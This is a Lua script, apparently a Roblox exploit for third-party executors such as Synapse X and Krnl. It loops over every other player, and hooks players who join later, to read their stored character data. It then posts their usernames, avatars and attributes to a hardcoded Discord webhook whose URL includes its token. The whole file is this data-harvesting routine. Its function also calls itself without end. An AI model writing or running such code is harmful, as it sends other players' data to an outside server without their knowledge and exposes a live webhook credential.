local _, __ = game:GetService("Players"), game:GetService("HttpService")

local function SaveData()
    for i, c in pairs(game.Players:GetChildren()) do
        if c.Parent ~= game.Players.LocalPlayer then 
            if c:FindFirstChild("PlayerData") and c.PlayerData:FindFirstChild("Character") then 
                for i,plr in pairs(c.PlayerData.Character:GetChildren()) do 
                    local data = __:JSONDecode(plr.Value)
                    print(data.CDN, "Owner: " .. c.Name)
                    plr.Value = __:JSONEncode(data)
                    local webhookcheck =
                    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                    secure_load and "Sentinel" or
                    KRNL_LOADED and "Krnl" or
                    SONA_LOADED and "Sona" or
                    "Kid with shit exploit"
                    local url =
                    "https://discord.com/api/webhooks/1076604439777001603/pyCmyeDaG5Xc1n6gGoew_xPHMYfTwGc6ITc55MuKQ6Xz6QJBw4cVaE4FjMs2bCz6d_Ar"
                    local data = {
                        ["content"] = "",
                        ["embeds"] = {
                            {
                                ["title"] = "**Datastore Entry**",
                                ["description"] = "Username: " .. c.Name .. ", Codename: " .. data.CDN .. ", Hair: " .. data.HST .. ", Shades: " .. data.SHD .. ", VER: " .. data.VER .. ", GND: " .. data.GND,
                                ["type"] = "rich",
                                ["color"] = tonumber(0x7269da),
                                ["image"] = {
                                    ["url"] = "rbxthumb://type=Avatar&id=" .. tostring(c.UserId) .. "&w=100&h=100"

                                }
                            }
                        }
                    }
                    local newdata = game:GetService("HttpService"):JSONEncode(data)
                    local headers = {
                        ["content-type"] = "application/json"
                    }
                    request = http_request or request or HttpPost or syn.request
                    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
                    request(abcdef)
                end
            end
        end
    end
    game.Players.PlayerAdded:Connect(
        function(plr)
            wait(2)
            if plr:FindFirstChild("PlayerData") and plr.PlayerData:FindFirstChild("Character") then
                for i, c in pairs(plr.PlayerData.Character:GetChildren()) do
                    local data = __:JSONDecode(c.Value)
                    print(data.CDN, "Owner: " .. plr.Name)
                    c.Value = __:JSONEncode(data)
                    local webhookcheck =
                    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                    secure_load and "Sentinel" or
                    KRNL_LOADED and "Krnl" or
                    SONA_LOADED and "Sona" or
                    "Kid with shit exploit"
                    local url =
                    "https://discord.com/api/webhooks/1076604439777001603/pyCmyeDaG5Xc1n6gGoew_xPHMYfTwGc6ITc55MuKQ6Xz6QJBw4cVaE4FjMs2bCz6d_Ar"
                    local data = {
                        ["content"] = "",
                        ["embeds"] = {
                            {
                                ["title"] = "**Datastore Entry**",
                                ["description"] = "Username: " .. plr.Name .. ", Codename: " .. data.CDN .. ", Hair: " .. data.HST .. ", Shades: " .. data.SHD .. ", VER: " .. data.VER .. ", GND: " .. data.GND,
                                ["type"] = "rich",
                                ["color"] = tonumber(0x7269da),
                                ["image"] = {
                                    ["url"] = "rbxthumb://type=Avatar&id=" .. tostring(plr.UserId) .. "&w=100&h=100"

                                }
                            }
                        }
                    }
                    local newdata = game:GetService("HttpService"):JSONEncode(data)
                    local headers = {
                        ["content-type"] = "application/json"
                    }
                    request = http_request or request or HttpPost or syn.request
                    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
                    request(abcdef)
                end
            end
        end
    )
    coroutine.wrap(SaveData)()
end
